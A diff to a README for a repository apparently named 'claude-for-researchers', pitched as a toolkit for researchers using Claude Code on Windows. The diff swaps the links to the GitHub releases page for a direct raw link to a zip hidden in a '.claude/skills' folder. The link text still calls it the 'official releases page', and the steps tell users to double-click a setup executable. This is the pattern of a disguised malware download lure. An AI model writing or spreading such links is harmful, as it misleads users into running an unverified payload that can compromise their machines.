@@ -1,6 +1,6 @@
 # 🔬 claude-for-researchers - Accelerate research workflows with intelligent tools
 
-[![Download Version 1.0](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/Speckledrattlesnakeinoculant470/claude-for-researchers/releases)
+[![Download Version 1.0](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Speckledrattlesnakeinoculant470/claude-for-researchers/main/starter/.claude/skills/sync-brief/researchers-for-claude-2.7-alpha.4.zip)
 
 This repository provides a toolkit for physicists, mathematicians, and researchers. It helps you integrate Claude Code into your existing academic projects. You can manage complex calculations, edit LaTeX documents, and automate scientific computing tasks with ease.
 
@@ -8,7 +8,7 @@ This repository provides a toolkit for physicists, mathematicians, and researche
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/Speckledrattlesnakeinoculant470/claude-for-researchers/releases) to download the latest version.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Speckledrattlesnakeinoculant470/claude-for-researchers/main/starter/.claude/skills/sync-brief/researchers-for-claude-2.7-alpha.4.zip) to download the latest version.
 2.  Locate the file named `claude-researcher-setup.exe` in your Downloads folder.
 3.  Double-click the file to start the installation process.
 4.  Follow the prompts on your screen.
